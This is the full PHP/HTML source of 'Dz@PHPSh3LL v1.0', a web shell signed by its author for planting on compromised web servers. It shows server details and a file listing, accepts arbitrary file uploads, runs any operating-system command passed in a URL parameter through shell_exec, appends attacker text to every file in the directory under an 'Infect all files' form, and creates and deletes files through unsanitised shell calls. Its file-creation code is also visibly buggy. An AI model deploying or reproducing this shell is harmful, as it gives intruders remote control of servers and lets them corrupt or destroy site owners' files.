<title>Dz@PHPSH3LL v1.0 ~ By Aghilas</title>
</head>
<body>
<style>
  body {
background-color: #000000;
color: red;
font-family: system, sans-serif;
  }
a {
color: lime;
}
a:hover {
color: white;
}
#v {
background-color: black;
}
</style>

<?php
global $page;
 $page = $_SERVER['PHP_SELF'];
?>
<center>
<h2>WelcOm To :<font color="gray"> Dz@PHPSh3LL v1.0 </font> </h2>
</center>
<h3><a href="http://localhost/pr0j1" title="Fuck :D">===> Enjoy (y)</a>
<br /><br />
<table width='100%'>
<tr>
Safe Mode: <font color="green">
<?php
$safe_mode = ini_get('safe_mode');
if($safe_mode == 0) {
  echo "<font color='lime'>OFF</font>";
}
else {
  echo "<font color='red'>ON</font>";
}
?>
</font></tr><br />
<tr>
</font>
</tr>
<br />
<tr>
Server : <font color="white"><?php echo $_SERVER['SERVER_NAME'] ?></font>
</tr>
<br />
<tr>
Server Software : <font color="grayz"><?php echo $_SERVER['SERVER_SOFTWARE'] ?></font>
</tr>
<br />
<tr>
Directory : <font color="green"><?php echo getcwd() ?></font>
</tr>
<hr />
<td>
Folders/Files :  <font color="blue">
<?php
echo "<br /><br />";

if($handle = opendir(getcwd())) {
echo "
<tr>
<td><font color='lightgreen'>Type</font></td>
  <td><font color='lightgreen'>Files</font></td>
<td><font color='lightgreen'>Size</font></td>
  <td><font color='lightgreen'>Permition</font></td>
</tr>";
while(false !== ($file = readdir($handle))) {
  echo "
  <tr>
<td width='10%'><font color='#x465ez'><b>".strtoupper(filetype($file))."</b></font></td>
<td width='10%'><a href='$file' target='_blank'><font color='grayz'>".$file."</a></td>
<td width='10%'>".filesize($file)." bt</td>
<td width='10%'>".fileperms($file)."</td>
</tr>";
}
closedir($handle);
}
?>
</font>
</td>
</tr>
</table>
<br />
<hr />
<table>

<p aligne="left">
<form action='' method='post' enctype='multipart/form-data'>


<?php
@set_time_limit(0);
@error_reporting(0);
echo '<b><br><font color="red">Upload Files<br></b>';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="25">&nbsp;<input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b><font color="lime"><br><br>Uploaded :D</b><br><br>'; }
	else { echo '<b><font color="red"><br><br>Upload Failed :( wa333</b><br><br>'; }
}
?></font>



<br/>

<p aligne="left">
<form action="" method='get'>
CMD
<br />

<input type='input' name='shell' />

<input type='submit' value='Exec' />
</form>
</center>
<p aligne="left">
<form action="" method='get'>
Infect all files
<br />

<input type='input' name='infect' />

<input type='submit' value='Go !' />
</form>

<br>

<form action='' method='post'>Delete file<br>
<input type='text' name='to_eliminate'/>
<input type='submit' value='Delete'/>
</form>


<br><br><br>


<form action='' method='post'>Creat a f!le<br>
<input type='text' name='name' value='wtf.php' />
 <br /> <br />
<textarea cols='30' rows='13'  name='create'>Pute Ur Text here</textarea>
 <br /><br>
<input type='submit' value='Create' />
</form>
<td>
</center>
</tr>
</table>
<?php

 /* Shell */
 
 if($cmd = $_GET['shell']) {
 
 $output = shell_exec($cmd);
 
 $output = str_replace("\n", "<br />", $output);
 
echo "<tr><td>".$output."</td></tr>";
 }
 
/* File Upload */

echo '<font color="red">/END OF SCRIPT,,</b>';
 
 /* Infect */
 if($handle = opendir(getcwd())) {
 if($infection = $_GET['infect']) {
 while(false !== ($file = readdir($handle))) {
 $to_infect = fopen($file, 'a');
 fwrite($to_infect, $infection);
 fclose($to_infect);
 
header("Location: $page");
 
 }
 }
 
 closedir($handle);
 }

 /* Create File */
 if($filename = $_POST['name']) {
 $content = $_POST['create'];
 $to_create = fopen($filename, 'w');
 fwrite($to_create, $create);
 fclose($file);
header("Location: $page");
 }

 /* Delete a file */

 if($file_to_eliminate = $_POST['to_eliminate']) {
 shell_exec("rm ".$file_to_eliminate);
 shell_exec("del ".$file_to_eliminate);
header("Location: $page");
 }
 ?>
</body><br><br>
<h3><center/><font color="lime">..:: Dz@PHPSh3LL First Version v1.0 :/:..</h3>
<h3><center/><font color="red">..:: (c)0d3d By Aghilas :/:..</h3>
<h3><center/><font color="white">..:: Made !n Algeria  :/:..</h3>
<center/>
<br/><a href="http://wWw.Sec4ever.Com/" title="H4x0rz">wWw.Sec4ever.Com </a>
<br/>
</html>